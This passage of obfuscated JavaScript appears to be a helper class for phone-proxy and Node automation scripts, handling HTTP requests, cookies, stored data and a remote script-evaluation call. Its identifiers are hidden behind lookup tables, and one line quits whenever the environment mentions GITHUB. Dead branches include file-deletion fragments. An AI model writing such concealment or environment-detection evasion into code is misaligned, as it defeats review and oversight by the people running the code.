    'ShnvD': function (S, a) {
      return S - a;
    },
    'HyRKw': function (S, a) {
      return S << a;
    },
    'qWGQE': function (S, a) {
      return S >>> a;
    },
    'xDXpN': function (S, a) {
      return S << a;
    },
    'izmSL': "isArray",
    'PEJul': function (S, a, Y, j, Z) {
      return S(a, Y, j, Z);
    },
    'BBKJc': function (S, a) {
      return S(a);
    },
    'BRCNQ': "==============📣系统通知📣==============",
    'Knwkb': 'push',
    'XgvQO': "join",
    'thwoM': "concat",
    'TDfto': function (S, a) {
      return S > a;
    },
    'zjgDG': function (S, a) {
      return S !== a;
    },
    'GBjsa': "TrFlN",
    'gDsfN': "indexOf",
    'AjAMi': "GITHUB",
    'xFdEV': 'exit',
    'TsxVh': "toObj",
    'fmALu': 'toStr',
    'uJdHd': 'getjson',
    'lwMvm': 'setjson',
    'yYKzB': "getScript",
    'YJGsn': "runScript",
    'JIeBo': "time",
    'eQYiN': "msg",
    'OOTUt': "wait"
  };
  p["sEkOb"](p["ndkrr"], typeof process) && JSON[p["RCuQp"]](process["env"])[p['gDsfN']](p['AjAMi']) > -1 && process[p["xFdEV"]](0);

  class C {
    constructor(S) {
      this["env"] = S;
    }

    [p["yEKyH"]](S, a = "GET") {
      const Y = {
        'wNCsl': function (Z, Q) {
          return p["vUthb"](Z, Q);
        },
        'oaUpP': p["xansl"],
        'xczlT': function (Z, Q) {
          return p['zYPmU'](Z, Q);
        },
        'EhzfP': function (Z, Q) {
          return p["eJcPH"](Z, Q);
        },
        'HIbzq': p["Ffwdi"],
        'PQCMA': p["TZDtX"]
      };
      S = p["LLmyY"](p['YiGml'], typeof S) ? {
        'url': S
      } : S;
      let j = this[p["ObOPk"]];
      p["QMUHn"](p["zHSSq"], a) && (j = this["post"]);
      p["QMUHn"](p["nKUNb"], a) && (j = this[p["BUgao"]]);
      return new Promise((Z, Q) => {
        Y["EhzfP"]("Jrbjx", Y["HIbzq"]) ? p = Y["wNCsl"](Y["oaUpP"], C) + '元' : j[Y['PQCMA']](this, S, (U, q, i) => {
          U ? Q(U) : Z(q);
        });
      });
    }

    [p["ObOPk"]](S) {
      return this[p["yEKyH"]][p["TZDtX"]](this[p["vahvK"]], S);
    }

    ["post"](S) {
      if (p["dpfdF"](p["eyKhd"], p["eyKhd"])) {
        a ? p["zYPmU"](Y, j) : Z(Q);
      } else {
        return this[p["yEKyH"]][p["TZDtX"]](this[p["vahvK"]], S, p["zHSSq"]);
      }
    }

    [p["BUgao"]](S) {
      return this[p["yEKyH"]][p["TZDtX"]](this[p["vahvK"]], S, p['nKUNb']);
    }

  }

  return new class {
    constructor(S, a) {
      if (p["dpfdF"]("rZDwk", p["nyIyV"])) {
        this["name"] = S;
        this[p["tTZNr"]] = new C(this);
        this["data"] = null;
        this["dataFile"] = "box.dat";
        this[p["pWUNv"]] = [];
        this[p["PSfXw"]] = false;
        this[p["gfRMI"]] = false;
        this[p["zYZMh"]] = "\n";
        this[p["GpvDT"]] = new Date()[p["rwkXM"]]();
        Object[p["XlxAL"]](this, a);
        this[p["EpagF"]]('', p['fSfdS'](p["gqCJK"]('🔔', this[p["Gfcja"]]), p["hekcr"]));
      } else {
        const [, j, Z] = /^@(.*?)\.(.*?)$/[p["EUGLY"]](a),
              Q = j ? this[p["JrMHo"]](j) : '';

        if (Q) {
          try {
            const B = i[p["YTTpc"]](Q);
            J = B ? this[p["laqkM"]](B, Z, '') : I;
          } catch (b) {
            E = '';
          }
        }
      }
    }

    [p["KrjuT"]]() {
      const S = {
        'UrvWd': function (a, Y) {
          return p["mPAYK"](a, Y);
        },
        'PyjmZ': function (a, Y) {
          return a + Y;
        },
        'ncOmw': p["PllJg"],
        'tKtOU': function (a, Y) {
          return p["iqado"](a, Y);
        },
        'qbEpB': function (a, Y) {
          return a << Y;
        },
        'RAqSi': function (a, Y) {
          return p["MzGTf"](a, Y);
        },
        'yipdK': "charCodeAt",
        'tCyJQ': function (a, Y) {
          return a | Y;
        },
        'Bhpih': function (a, Y) {
          return a << Y;
        },
        'SEuhA': function (a, Y) {
          return p["MzGTf"](a, Y);
        },
        'bPdms': function (a, Y) {
          return p['MzGTf'](a, Y);
        }
      };

      if (p["TKgVx"](p["olIIK"], "ITvHD")) {
        S["UrvWd"](h, 191) && z < 224 ? (v = M["charCodeAt"](S['PyjmZ'](d, 1)), u += e[S["ncOmw"]](S["tKtOU"](S['qbEpB'](S["RAqSi"](A, 31), 6), S["RAqSi"](k, 63))), o += 2) : (g = t['charCodeAt'](S["PyjmZ"](L, 1)), X = m[S["yipdK"]](n + 2), F += w[S["ncOmw"]](S['tCyJQ'](S["Bhpih"](S['SEuhA'](G, 15), 12) | S['RAqSi'](s, 63) << 6, S["bPdms"](N, 63))), l += 3);
      } else {
        return p['HHxsA']("undefined", typeof module) && !!module[p["CQFuU"]];
      }
    }

    [p["TEhQN"]]() {
      if (p["uPIiE"](p['moxoN'], "yRWdM")) {
        return p["HHxsA"](p["ndkrr"], typeof $task);
      } else {
        throw c;
      }
    }

    ["isSurge"]() {
      return p["ndkrr"] != typeof $httpClient && p['abQqZ'](p["ndkrr"], typeof $loon);
    }

    ["isLoon"]() {
      return p['HHxsA'](p['ndkrr'], typeof $loon);
    }

    [p['TsxVh']](S, a = null) {
      if (p["QXdUA"]('cYZmG', "wVRvr")) {
        try {
          if (p["OEsXl"](p["UAHdw"], "ILxfY")) {
            return JSON[p['YTTpc']](S);
          } else {
            if (typeof S[p["YTTpc"]](a) == p["yNHJl"]) {
              return true;
            } else {
              Z[p["EpagF"]](Q);
            }
          }
        } catch {
          if (p["eJcPH"](p["PnEQd"], p["PnEQd"])) {
            return a;
          } else {
            return;
          }
        }
      } else {
        let Q = p['zYPmU'](a, Y),
            B = p["mPAYK"](j, Q[p["OakBY"]]) ? p["JeirW"](Z, Q["length"]) : 0,
            b = '';

        for (let I = 0; I < B; I++) {
          b += b;
        }

        b += Q;
        return b;
      }
    }

    [p["fmALu"]](S, a = null) {
      const Y = {
        'alGFV': function (j, Z) {
          return j < Z;
        },
        'KpmMK': p["PllJg"],
        'qVGng': function (j, Z) {
          return p["BkkNj"](j, Z);
        },
        'ghuQL': function (j, Z) {
          return p["njcCW"](j, Z);
        },
        'SuDaC': p['OaFOK'],
        'jZCnT': function (j, Z) {
          return j + Z;
        },
        'whgdf': function (j, Z) {
          return p["FqswT"](j, Z);
        },
        'BqmoY': function (j, Z) {
          return p["GzHCj"](j, Z);
        },
        'HpgvJ': function (j, Z) {
          return p["HqOfP"](j, Z);
        },
        'xuUjQ': function (j, Z) {
          return p["YvJVr"](j, Z);
        },
        'RcLsT': function (j, Z) {
          return p["FqswT"](j, Z);
        },
        'tNIKw': function (j, Z) {
          return p["iqado"](j, Z);
        },
        'pyVIl': function (j, Z) {
          return p["cPawj"](j, Z);
        },
        'JFGjI': function (j, Z) {
          return j & Z;
        },
        'wjotr': function (j, Z) {
          return p["kVVAm"](j, Z);
        },
        'MBIYn': function (j, Z) {
          return p['HqOfP'](j, Z);
        }
      };

      if (p['uPIiE']("ddyeK", p["MUUEt"])) {
        k = o["charCodeAt"](g);
        Y["alGFV"](t, 128) ? (xx += xf[Y["KpmMK"]](xT), xc++) : Y['qVGng'](xp, 191) && Y['ghuQL'](xC, 224) ? (xS = xa[Y["SuDaC"]](Y['jZCnT'](xY, 1)), xj += xZ[Y["KpmMK"]](Y["whgdf"](Y["BqmoY"](xQ & 31, 6), Y["HpgvJ"](xB, 63))), xb += 2) : (xU = xq['charCodeAt'](Y["xuUjQ"](xi, 1)), xJ = xI['charCodeAt'](Y["xuUjQ"](xV, 2)), xE += xW[Y["KpmMK"]](Y['RcLsT'](Y["tNIKw"](Y["pyVIl"](Y["JFGjI"](xO, 15), 12), Y["wjotr"](xP & 63, 6)), Y["MBIYn"](xh, 63))), xz += 3);
      } else {
        try {
          return JSON[p["RCuQp"]](S);
        } catch {
          if (p["QMUHn"](p["WigGt"], "UVTpF")) {
            return a;
          } else {
            return;
          }
        }
      }
    }

    [p["uJdHd"]](S, a) {
      const Y = {
        'UQUOE': p['nkjIw'],
        'jThwJ': function (Q, B) {
          return p["EHEwT"](Q, B);
        },
        'fWywc': p['OakBY'],
        'SULhX': p["OaFOK"],
        'hDQRt': function (Q, B) {
          return Q > B;
        },
        'sLeeH': "fromCharCode",
        'vyFmv': function (Q, B) {
          return p["ELjRv"](Q, B);
        },
        'NdAJz': function (Q, B) {
          return Q >> B;
        },
        'BsAjT': function (Q, B) {
          return Q | B;
        },
        'vIoXg': function (Q, B) {
          return p["hiJrK"](Q, B);
        },
        'aCRNx': function (Q, B) {
          return p["wSNNM"](Q, B);
        },
        'VoirO': function (Q, B) {
          return p["hiJrK"](Q, B);
        },
        'imHel': function (Q, B) {
          return p["icCLE"](Q, B);
        }
      };
      let j = a;
      const Z = this[p["TbLse"]](S);

      if (Z) {
        try {
          if (p["OECAm"](p['lKqWU'], p['lKqWU'])) {
            j = JSON[p['YTTpc']](this[p["TbLse"]](S));
          } else {
            B = b[Y['UQUOE']](/\r\n/g, "\n");

            for (var B = '', b = 0; Y['jThwJ'](b, U[Y['fWywc']]); b++) {
              var U = O[Y["SULhX"]](b);
              Y["hDQRt"](128, U) ? B += P[Y["sLeeH"]](U) : U > 127 && Y["hDQRt"](2048, U) ? (B += h[Y["sLeeH"]](Y['vyFmv'](Y["NdAJz"](U, 6), 192)), B += z["fromCharCode"](Y["BsAjT"](63 & U, 128))) : (B += v["fromCharCode"](Y['vIoXg'](U, 12) | 224), B += M[Y["sLeeH"]](Y['aCRNx'](Y["VoirO"](U, 6) & 63, 128)), B += d["fromCharCode"](Y["imHel"](63 & U, 128)));
            }

            return B;
          }
        } catch {}
      }

      return j;
    }

    [p["lwMvm"]](S, a) {
      if (p['OEsXl'](p['nkxqU'], p["nkxqU"])) {
        try {
          if (p['pvYcm']("fecFj", p["RtLih"])) {
            try {
              return this["setdata"](Y[p["RCuQp"]](j), Z);
            } catch {
              return false;
            }
          } else {
            return this[p['OdOgo']](JSON[p["RCuQp"]](S), a);
          }
        } catch {
          if (p["pYeKT"](p["Hvrfl"], "RfVYF")) {
            return;
          } else {
            return false;
          }
        }
      } else {
        const Q = a[p['YTTpc']](Y);
        j = Q ? this[p["laqkM"]](Q, Z, '') : Q;
      }
    }

    [p['yYKzB']](S) {
      const a = {
        'WoSnn': "open-url",
        'OrVME': p["ojkaK"],
        'UaXFA': p["lwNtd"],
        'TYShR': p["fkYsv"],
        'WNVFV': p["QiEkZ"],
        'VuVat': p["EpagF"],
        'LDUQX': "schema",
        'ncDwn': function (Y, j) {
          return Y === j;
        },
        'PiBtZ': p["bpiZV"],
        'lXfah': p["ObOPk"]
      };

      if (p["WeMSp"] !== p["WeMSp"]) {
        let j = a[a["WoSnn"]] || Y[a["OrVME"]] || j[a["UaXFA"]],
            Z = Z[a["TYShR"]] || Q[a["WNVFV"]];
        const Q = {
          'open-url': j,
          'media-url': Z
        };
        return Q;
      } else {
        return new Promise(j => {
          const Z = {
            'htHBs': a["VuVat"],
            'tITiE': "data",
            'UUGem': a["LDUQX"]
          };

          if (a["ncDwn"](a["PiBtZ"], 'rqroY')) {
            const Q = {
              'url': S
            };
            this[a["lXfah"]](Q, (B, b, U) => j(U));
          } else {
            p[Z["htHBs"]](C[Z['tITiE']][Z['UUGem']]);
          }
        });
      }
    }

    [p['YJGsn']](S, a) {
      const Y = {
        'FKsLv': p['TbLse'],
        'wmhsU': p["QOfCX"],
        'NuBUr': "replace",
        'kqUAs': "trim",
        'xFIlW': p['YNSwh'],
        'thNNu': function (j, Z) {
          return j * Z;
        },
        'lDoah': p['WJSeA'],
        'bzLsy': p["UyCjF"],
        'ecJhK': p['evLIU'],
        'crVNv': function (j, Z) {
          return j + Z;
        },
        'ObJqR': "http://",
        'oQCmg': "/v1/scripting/evaluate",
        'vUuKS': p["stalv"],
        'mlLyF': "post"
      };
      return new Promise(j => {
        let Z = this[Y['FKsLv']](Y["wmhsU"]);
        Z = Z ? Z[Y["NuBUr"]](/\n/g, '')[Y["kqUAs"]]() : Z;
        let Q = this[Y["FKsLv"]](Y["xFIlW"]);
        Q = Q ? Y["thNNu"](1, Q) : 20;
        Q = a && a[Y['lDoah']] ? a[Y["lDoah"]] : Q;
        const B = {
          'script_text': S,
          'mock_type': Y["bzLsy"],
          'timeout': Q
        },
              [b, U] = Z[Y["ecJhK"]]('@'),
              q = {
          'url': Y["crVNv"](Y["ObJqR"] + U, Y["oQCmg"]),
          'body': B,
          'headers': {
            'X-Key': b,
            'Accept': Y["vUuKS"]
          }
        };
        this[Y["mlLyF"]](q, (i, J, I) => j(I));
      })[p["TMZRE"]](j => this["logErr"](j));
    }

    ["loaddata"]() {
      const S = {
        'XPczb': function (a, Y) {
          return a ^ Y;
        }
      };

      if (p["pYeKT"]("FCVVc", "fnQxC")) {
        if (!this[p["KrjuT"]]()) {
          return {};
        }

        {
          this['fs'] = this['fs'] ? this['fs'] : require('fs');
          this[p["gKGOw"]] = this['path'] ? this["path"] : p["zezEm"](require, "path");
          const a = this[p['gKGOw']][p["RjPnH"]](this[p["xXhjZ"]]),
                Y = this[p["gKGOw"]][p["RjPnH"]](process['cwd'](), this["dataFile"]),
                j = this['fs']['existsSync'](a),
                Z = !j && this['fs'][p["lkrOZ"]](Y);

          if (p["UXuFw"](!j, !Z)) {
            return {};
          }

          {
            if (p["KoZWa"] !== 'Ptvnk') {
              const Q = j ? a : Y;

              try {
                return p['QMUHn'](p["fPWUS"], p["fPWUS"]) ? JSON[p["YTTpc"]](this['fs'][p['yOzYr']](Q)) : C ^ (S | ~a);
              } catch (b) {
                return {};
              }
            } else {
              return;
            }
          }
        }
      } else {
        return new C(i => Y(i, j));
      }
    }

    [p["SItKq"]]() {
      if (this["isNode"]()) {
        this['fs'] = this['fs'] ? this['fs'] : p["tMFnY"](require, 'fs');
        this[p["gKGOw"]] = this[p["gKGOw"]] ? this[p["gKGOw"]] : p["LqimL"](require, p["gKGOw"]);
        const S = this[p["gKGOw"]]["resolve"](this[p["xXhjZ"]]),
              a = this[p["gKGOw"]]["resolve"](process[p['rqfCP']](), this['dataFile']),
              Y = this['fs'][p['lkrOZ']](S),
              j = !Y && this['fs'][p['lkrOZ']](a),
              Z = JSON['stringify'](this[p["Bktev"]]);
        Y ? this['fs']['writeFileSync'](S, Z) : j ? this['fs'][p["MSCAv"]](a, Z) : this['fs'][p['MSCAv']](S, Z);
      }
    }

    [p["laqkM"]](S, a, Y) {
      const j = {
        'SJdFF': p["YTTpc"]
      };

      if (p["OECAm"](p["VBFSP"], p['sQUUP'])) {
        return p[j['SJdFF']](C);
      } else {
        const Q = a[p["nkjIw"]](/\[(\d+)\]/g, p["kdHtp"])[p['evLIU']]('.');
        let B = S;

        for (const b of Q) if (B = p["zYPmU"](Object, B)[b], p["eJcPH"](void 0, B)) {
          return Y;
        }

        return B;
      }
    }

    ['lodash_set'](S, a, Y) {
      if (p["XReEV"](p["whlcJ"], p["bACgC"])) {
        return p["EenlS"](p["LqimL"](Object, S), S) ? S : (Array['isArray'](a) || (a = a[p['rGDJj']]()[p['zkpOW']](/[^.[\]]+/g) || []), a[p["nWjqV"]](0, -1)[p["BoyEO"]]((j, Z, Q) => Object(j[Z]) === j[Z] ? j[Z] : j[Z] = Math["abs"](a[Q + 1]) >> 0 == +a[Q + 1] ? [] : {}, S)[a[p['BRBwt'](a[p["OakBY"]], 1)]] = Y, S);
      } else {
        let Z = C[p["ojkaK"]] || S[p["lwNtd"]] || a[p["mKOJb"]];
        const Q = {
          'url': Z
        };
        return Q;
      }
    }

    ["getdata"](S) {
      const a = {
        'MuiXv': p["Tosyp"]
      };

      if (p["uPIiE"](p["BzvSr"], "XtKaZ")) {
        return;
      } else {
        let j = this['getval'](S);

        if (/^@/['test'](S)) {
          const [, Z, Q] = /^@(.*?)\.(.*?)$/[p['EUGLY']](S),
                B = Z ? this[p["JrMHo"]](Z) : '';

          if (B) {
            try {
              const b = JSON[p["YTTpc"]](B);
              j = b ? this[p["laqkM"]](b, Q, '') : j;
            } catch (U) {
              p["eTTEO"](p["UTTFk"], "YehTV") ? j = '' : c = a["MuiXv"];
            }
          }
        }

        return j;
      }
    }

    [p['OdOgo']](S, a) {
      const Y = {
        'sWlbw': function (Z, Q) {
          return p["gqCJK"](Z, Q);
        },
        'loGzU': "statSync",
        'NrKmO': p["IBedw"],
        'xSVpL': function (Z, Q, B) {
          return p['YBFrW'](Z, Q, B);
        },
        'SXmIJ': "forEach",
        'VLHNY': p['avqsd']
      };
      let j = false;

      if (/^@/[p["XaBsU"]](a)) {
        const [, Z, Q] = /^@(.*?)\.(.*?)$/[p["EUGLY"]](a),
              B = this[p["JrMHo"]](Z),
              b = Z ? p["OEsXl"](p["kBRzH"], B) ? null : B || '{}' : '{}';

        try {
          const U = JSON[p["YTTpc"]](b);
          this[p['XGvRG']](U, Q, S);
          j = this[p["OuTOW"]](JSON[p['RCuQp']](U), Z);
        } catch (q) {
          if (p["QXdUA"](p["ZGhoB"], "IWXJI")) {
            const J = {
              'sjjjj': function (I, V) {
                return Y["sWlbw"](I, V);
              },
              'jzopb': Y["loGzU"],
              'jKnzC': Y["NrKmO"],
              'fzMdl': function (I, V, E) {
                return Y['xSVpL'](I, V, E);
              }
            };
            b[Y["SXmIJ"]](function (A) {
              h++;
              var k = J["sjjjj"](J["sjjjj"](z, '/'), A);
              v[J["jzopb"]](k)[J["jKnzC"]]() ? J["fzMdl"](M, k, true) : d['unlinkSync'](k);
            });
            V == E && W && O[Y["VLHNY"]](P);
          } else {
            const J = {};
            this[p['XGvRG']](J, Q, S);
            j = this[p["OuTOW"]](JSON[p["RCuQp"]](J), Z);
          }
        }
      } else {
        j = this["setval"](S, a);
      }

      return j;
    }

    [p["JrMHo"]](S) {
      return this[p['NvGvD']]() || this[p["gXLLg"]]() ? $persistentStore[p["QEklD"]](S) : this["isQuanX"]() ? $prefs[p["JilvT"]](S) : this[p['KrjuT']]() ? (this[p["Bktev"]] = this[p["GvmCb"]](), this[p["Bktev"]][S]) : this[p['Bktev']] && this[p["Bktev"]][S] || null;
    }

    ['setval'](S, a) {
      return this["isSurge"]() || this[p['gXLLg']]() ? $persistentStore[p["Erjln"]](S, a) : this[p["TEhQN"]]() ? $prefs["setValueForKey"](S, a) : this[p['KrjuT']]() ? (this["data"] = this[p["GvmCb"]](), this[p["Bktev"]][a] = S, this[p["SItKq"]](), true) : this[p["Bktev"]] && this[p["Bktev"]][a] || null;
    }

    [p["pswtb"]](S) {
      if (p["eTTEO"](p["mAQuS"], p["wJEVG"])) {
        return;
      } else {
        this[p["UnUmH"]] = this[p["UnUmH"]] ? this[p['UnUmH']] : p["VWREu"](require, p['UnUmH']);
        this[p["UfFmc"]] = this[p["UfFmc"]] ? this[p["UfFmc"]] : p['LqimL'](require, "tough-cookie");
        this["ckjar"] = this[p['KUpZH']] ? this[p["KUpZH"]] : new this[p['UfFmc']][p["wbhLH"]]();
        S && (S[p["Ufsfg"]] = S["headers"] ? S[p["Ufsfg"]] : {}, p["eTTEO"](void 0, S[p['Ufsfg']][p["EYucJ"]]) && p["eTTEO"](void 0, S['cookieJar']) && (S[p["EwYhm"]] = this["ckjar"]));
      }
    }

    [p["ObOPk"]](S, a = () => {}) {
      const j = {
        'X-Surge-Skip-Scripting': false
      },
            Z = {
        'hints': false
      };
      S[p["Ufsfg"]] && (delete S[p["Ufsfg"]]['Content-Type'], delete S[p['Ufsfg']]["Content-Length"]);
      this[p["NvGvD"]]() || this[p["gXLLg"]]() ? (this[p["NvGvD"]]() && this[p["gfRMI"]] && (S[p["Ufsfg"]] = S[p["Ufsfg"]] || {}, Object[p['XlxAL']](S["headers"], j)), $httpClient[p["ObOPk"]](S, (Q, B, b) => {
        if (p["pYeKT"]("IitXF", "DdGjk")) {
          p["XxBGY"](!Q, B) && (B[p["uZTTG"]] = b, B[p["RacES"]] = B[p['PWoQA']]);
          p["hwvxW"](a, Q, B, b);
        } else {
          return;
        }
      })) : this[p["TEhQN"]]() ? (this[p["gfRMI"]] && (S[p["mGhWK"]] = S[p["mGhWK"]] || {}, Object[p["XlxAL"]](S[p["mGhWK"]], Z)), $task['fetch'](S)['then'](Q => {
        const {
          'statusCode': B,
          'statusCode': b,
          'headers': U,
          'body': q
        } = Q,
              i = {
          'status': B,
          'statusCode': b,
          'headers': U,
          'body': q
        };
        a(null, i, q);
      }, Q => a(Q))) : this[p['KrjuT']]() && (this[p["pswtb"]](S), this['got'](S)['on'](p["uZRAe"], (Q, B) => {
        const b = {
          'xrYJU': function (U, q, i) {
            return p["YBFrW"](U, q, i);
          },
          'ddLYY': p['WqVMM'],
          'QvLaM': "length",
          'AjWNp': p["jZbbI"],
          'YAnmU': function (U, q) {
            return p["LLmyY"](U, q);
          },
          'RIjTK': "rmdirSync"
        };

        try {
          if (Q['headers']["set-cookie"]) {
            if (p["fruUq"] !== p["ZCHSn"]) {
              const U = Q["headers"]["set-cookie"][p["jBBop"]](this[p['UfFmc']]['Cookie'][p["YTTpc"]])["toString"]();
              this[p["KUpZH"]][p["zyxAx"]](U, null);
              B[p["EwYhm"]] = this[p["KUpZH"]];
            } else {
              const i = {
                'wxwCX': function (E, W, O) {
                  return b['xrYJU'](E, W, O);
                },
                'HllKf': b["ddLYY"]
              };
              var J = U["readdirSync"](q),
                  I = J[b["QvLaM"]],
                  V = 0;
              I > 0 ? (J[b["AjWNp"]](function (w) {
                V++;
                var G = o + '/' + w;
                g['statSync'](G)["isDirectory"]() ? i["wxwCX"](t, G, true) : J[i["HllKf"]](G);
              }), b["YAnmU"](I, V) && e && A[b["RIjTK"]](k)) : I == 0 && o && g[b['RIjTK']](t);
            }
          }
        } catch (i) {
          p["mcwDC"] === p["mcwDC"] ? this[p['bdYaD']](i) : p['unlinkSync'](C);
        }
      })[p["rMFJs"]](Q => {
        const {
          'statusCode': B,
          'statusCode': b,
          'headers': U,
          'body': q
        } = Q,
              i = {
          'status': B,
          'statusCode': b,
          'headers': U,
          'body': q
        };
        p['RKyIx'](a, null, i, q);
      }, Q => {
        const {
          'message': B,
          'response': b
        } = Q;
        p["RKyIx"](a, B, b, b && b[p['uZTTG']]);
      }));
    }

    [p['JBlns']](S, a = () => {}) {
      const Y = {
        'zaYxC': p["YTTpc"],
        'TOgZX': 'getdata',
        'ohScP': '@chavy_boxjs_userCfgs.httpapi',
        'WWQur': p["nkjIw"],
        'LEVtq': p["WJSeA"],
        'jcOBp': p["evLIU"],
        'ZRqwK': p['XMRkJ'],
        'JjtpA': p["awTOK"],
        'HOEmq': p["stalv"],
        'fQPWQ': function (j, Z) {
          return p["OECAm"](j, Z);
        },
        'fmOEc': p['EtYHG'],
        'fmpOD': "sVRtC",
        'GQodK': function (j, Z, Q, B) {
          return p["hwvxW"](j, Z, Q, B);
        }
      };
      const j = {
        'X-Surge-Skip-Scripting': false
      },
            Z = {
        'hints': false
      };

      if (S[p["uZTTG"]] && S[p["Ufsfg"]] && !S[p["Ufsfg"]]["Content-Type"] && (S[p["Ufsfg"]][p["WFTAO"]] = p['UWYCE']), S[p['Ufsfg']] && delete S["headers"]["Content-Length"], this[p['NvGvD']]() || this[p['gXLLg']]()) {
        this["isSurge"]() && this[p["gfRMI"]] && (S[p["Ufsfg"]] = S[p["Ufsfg"]] || {}, Object["assign"](S[p['Ufsfg']], j));
        $httpClient[p["JBlns"]](S, (Q, B, b) => {
          p["pYoPM"](!Q, B) && (B["body"] = b, B["statusCode"] = B[p["PWoQA"]]);
          p['YiNrA'](a, Q, B, b);
        });
      } else {
        if (p["Wlkha"] !== p["OgVdL"]) {
          if (this[p['TEhQN']]()) {
            S[p["kOHbb"]] = p["zHSSq"];
            this[p['gfRMI']] && (S[p['mGhWK']] = S['opts'] || {}, Object[p["XlxAL"]](S["opts"], Z));
            $task[p["fdBtA"]](S)[p['rMFJs']](Q => {
              const {
                'statusCode': B,
                'statusCode': b,
                'headers': U,
                'body': q
              } = Q,
                    i = {
                'status': B,
                'statusCode': b,
                'headers': U,
                'body': q
              };
              a(null, i, q);
            }, Q => a(Q));
          } else {
            if ('XZGLm' === p['tKavq']) {
              try {
                Y = j[Y["zaYxC"]](this[Y["TOgZX"]](Z));
              } catch {}
            } else {
              if (this[p["KrjuT"]]()) {
                if (p["EenlS"](p['skKHu'], "oWXez")) {
                  this[p["pswtb"]](S);
                  const {
                    'url': B,
                    ...b
                  } = S;
                  this[p["UnUmH"]]["post"](B, b)[p["rMFJs"]](U => {
                    const q = {
                      'wEyUS': "getdata",
                      'iZCwa': Y["ohScP"],
                      'pRYGo': Y["WWQur"],
                      'WWpqJ': "trim",
                      'vXtIs': Y["LEVtq"],
                      'WgwrY': 'cron',
                      'rghXN': Y["jcOBp"],
                      'rbIKF': function (i, J) {
                        return i + J;
                      },
                      'cebFV': Y["ZRqwK"],
                      'Jaljl': Y["JjtpA"],
                      'rPJFm': Y['HOEmq']
                    };

                    if (Y["fQPWQ"](Y["fmOEc"], Y["fmpOD"])) {
                      let I = this[q["wEyUS"]](q["iZCwa"]);
                      I = I ? I[q["pRYGo"]](/\n/g, '')[q["WWpqJ"]]() : I;
                      let V = this[q["wEyUS"]]("@chavy_boxjs_userCfgs.httpapi_timeout");
                      V = V ? 1 * V : 20;
                      V = a && Y[q['vXtIs']] ? j["timeout"] : V;
                      const E = {
                        'script_text': Z,
                        'mock_type': q["WgwrY"],
                        'timeout': V
                      },
                            [W, O] = I[q["rghXN"]]('@'),
                            P = {
                        'url': q["rbIKF"](q["rbIKF"](q["cebFV"], O), q["Jaljl"]),
                        'body': E,
                        'headers': {
                          'X-Key': W,
                          'Accept': q['rPJFm']
                        }
                      };
                      this["post"](P, (h, z, v) => I(v));
                    } else {
                      const {
                        'statusCode': J,
                        'statusCode': I,
                        'headers': V,
                        'body': E
                      } = U,
                            W = {
                        'status': J,
                        'statusCode': I,
                        'headers': V,
                        'body': E
                      };
                      a(null, W, E);
                    }
                  }, U => {
                    const {
                      'message': q,
                      'response': i
                    } = U;
                    p['wdjsG'](a, q, i, i && i[p["uZTTG"]]);
                  });
                } else {
                  return {};
                }
              }
            }
          }
        } else {
          const i = new C()[p["rwkXM"]](),
                J = p["jSddq"](i, this[p["GpvDT"]]) / 1000;
          this['log']('', p["wQqon"](p["FZjHX"](p['fSfdS']('🔔', this["name"]), p["QFjSh"]), J) + " 秒");
          this[p["EpagF"]]();
          (this["isSurge"]() || this[p["TEhQN"]]() || this[p["gXLLg"]]()) && S(a);
        }
      }
    }

    [p["BUgao"]](S, a = () => {}) {
      const Y = {
        'nNtGF': function (Q, B) {
          return p["sEkOb"](Q, B);
        },
        'mTITD': p["ndkrr"],
        'oaObh': function (Q, B, b, U) {
          return p['ztCQh'](Q, B, b, U);
        },
        'gIylR': p["PllJg"],
        'Uuxwi': p["oxxEd"],
        'QSGzX': p["ClDME"],
        'rrTpo': p["UnUmH"],
        'UnXkB': p["UfFmc"],
        'cAMVP': function (Q, B) {
          return Q(B);
        },
        'mFpUE': p["KUpZH"],
        'LTxZc': "CookieJar",
        'VJjUU': p["Ufsfg"],
        'vrsHI': function (Q, B) {
          return p['qpgdd'](Q, B);
        },
        'QOMQZ': p["EYucJ"],
        'SoJiS': function (Q, B) {
          return p["NSZIb"](Q, B);
        },
        'yJigh': "cookieJar"
      },
            j = {
        'X-Surge-Skip-Scripting': false
      },
            Z = {
        'hints': false
      };

      if (S[p["uZTTG"]] && S[p["Ufsfg"]] && !S['headers']["Content-Type"] && (S[p['Ufsfg']][p["WFTAO"]] = p["UWYCE"]), S[p['Ufsfg']] && delete S["headers"]['Content-Length'], this[p['NvGvD']]() || this[p['gXLLg']]()) {
        if (p["CmwsV"] !== p["vMYsg"]) {
          this[p["NvGvD"]]() && this[p["gfRMI"]] && (S[p["Ufsfg"]] = S[p["Ufsfg"]] || {}, Object[p["XlxAL"]](S[p["Ufsfg"]], j));
          $httpClient[p["BUgao"]](S, (Q, B, b) => {
            p['qpgdd'](p["nPTxz"], p['yRDNE']) ? c() : (p["gwRAk"](!Q, B) && (B[p["uZTTG"]] = b, B[p["RacES"]] = B[p["PWoQA"]]), p["GCFnt"](a, Q, B, b));
          });
        } else {
          return Y["nNtGF"](Y["mTITD"], typeof c);
        }
      } else {
        if (p['dpfdF'](p["UIfGT"], p['feAfW'])) {
          if (this["isQuanX"]()) {
            S[p["kOHbb"]] = p['nKUNb'];
            this[p["gfRMI"]] && (S[p["mGhWK"]] = S[p["mGhWK"]] || {}, Object[p["XlxAL"]](S[p["mGhWK"]], Z));
            $task["fetch"](S)[p['rMFJs']](B => {
              const {
                'statusCode': b,
                'statusCode': U,
                'headers': q,
                'body': i
              } = B,
                    J = {
                'status': b,
                'statusCode': U,
                'headers': q,
                'body': i
              };
              Y['oaObh'](a, null, J, i);
            }, B => a(B));
          } else {
            if (p["hLLKO"]("eulTN", "qGPjT")) {
              return p['nnECN'](p["ndkrr"], typeof c);
            } else {
              if (this['isNode']()) {
                this[p['pswtb']](S);
                const {
                  'url': b,
                  ...U
                } = S;
                this[p["UnUmH"]]["put"](b, U)[p["rMFJs"]](q => {
                  const i = {
                    'Mhphk': Y["gIylR"]
                  };

                  if (Y["Uuxwi"] === Y['QSGzX']) {
                    C += S[i['Mhphk']](a);
                  } else {
                    const {
                      'statusCode': I,
                      'statusCode': V,
                      'headers': E,
                      'body': W
                    } = q,
                          O = {
                      'status': I,
                      'statusCode': V,
                      'headers': E,
                      'body': W
                    };
                    Y['oaObh'](a, null, O, W);
                  }
                }, q => {
                  const {
                    'message': i,
                    'response': J
                  } = q;
                  a(i, J, J && J[p["uZTTG"]]);
                });
              }
            }
          }
        } else {
